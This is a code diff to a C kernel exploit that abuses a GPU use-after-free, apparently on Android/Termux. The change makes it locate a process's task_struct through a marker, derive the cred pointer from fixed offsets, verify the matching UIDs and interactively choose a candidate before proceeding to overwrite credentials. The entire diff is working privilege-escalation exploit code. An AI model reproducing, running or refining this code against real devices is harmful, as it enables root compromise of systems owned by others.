@@ -1825,11 +1825,28 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
         {
             msync(dst_vma, PAGE_SIZE, MS_SYNC | MS_INVALIDATE);
             pid_t found_pid = 0;
+            int off = 0;
             if (find_marker_in_page((uint8_t *)dst_vma, PAGE_SIZE, current_va, &found_pid))
             {
+                // Find the exact offset for logging
+                for (int i = 0; i < 4096 - 8; i++) {
+                    if (memcmp((uint8_t *)dst_vma + i, MARKER_NAME, 8) == 0) {
+                        off = i;
+                        break;
+                    }
+                }
+
+                fprintf(stderr, "\n[?] POTENTIAL TASK FOUND at VA 0x%lx, offset 0x%x, PID=%d\n", 
+                        (unsigned long)current_va, off, found_pid);
+                
+                // Adjust offsets dynamically based on where the marker was found
+                // We assume OFFSET_COMM (0x818) is the standard, so we shift accordingly
+                uint64_t task_start_va = current_va + off - OFFSET_COMM;
+                uint64_t cred_ptr_va = task_start_va + OFFSET_CRED;
+
                 // Verify task_struct by reading cred
                 uint64_t cred_ptr = 0;
-                gpu_read_task_struct(fd, current_va + OFFSET_CRED, (uint8_t *)&cred_ptr, 8);
+                gpu_read_task_struct(fd, cred_ptr_va, (uint8_t *)&cred_ptr, 8);
                 
                 if ((cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                     uint32_t uids[8];
@@ -1838,23 +1855,41 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                         int match = 0;
                         for(int j=0; j<8; j++) if(uids[j] == my_uid) match++;
                         
-                        if (match >= 2) {
-                            marker_found = 1;
-                            *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
-                            *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
-                            *(uint64_t *)&gbuf[GBUF_CRED_PTR] = cred_ptr;
-                            
-                            // Protect target PID
-                            for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
-                                if (spray_ctrl[si].pid == found_pid) {
-                                    spray_ctrl[si].do_action = 1;
-                                    break;
+                        fprintf(stderr, "    [*] Verification: CRED=0x%lx, UIDs: %d %d %d %d (Matches: %d)\n", 
+                                (unsigned long)cred_ptr, uids[0], uids[1], uids[2], uids[3], match);
+                        
+                        fprintf(stderr, "    [>] Use this candidate? (y/n): ");
+                        fflush(stderr);
+                        
+                        char c = 0;
+                        // Read from stdin. In Termux/Shell this will wait.
+                        // We use a simple read(0, ...) to avoid issues with buffered getchar
+                        if (read(0, &c, 1) > 0) {
+                            if (c == 'y' || c == 'Y') {
+                                marker_found = 1;
+                                *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
+                                *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = cred_ptr;
+                                *(uint32_t *)&gbuf[GBUF_COMM_OFF] = off;
+                                
+                                // Protect target PID
+                                for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
+                                    if (spray_ctrl[si].pid == found_pid) {
+                                        spray_ctrl[si].do_action = 1;
+                                        break;
+                                    }
                                 }
+                                fprintf(stderr, "\n[!!!] PROCEEDING with Task at 0x%lx\n", (unsigned long)task_start_va);
+                            } else {
+                                fprintf(stderr, "    [-] Skipping candidate...\n");
                             }
-                            fprintf(stderr, "\n[!!!] VERIFIED SUCCESS! Task at 0x%lx, PID=%d, CRED=0x%lx\n", 
-                                    (unsigned long)current_va, found_pid, (unsigned long)cred_ptr);
+                            // Clean up newline from buffer
+                            char dummy;
+                            while(read(0, &dummy, 1) > 0 && dummy != '\n');
                         }
                     }
+                } else {
+                    fprintf(stderr, "    [-] Invalid CRED pointer: 0x%lx\n", (unsigned long)cred_ptr);
                 }
             }
         }
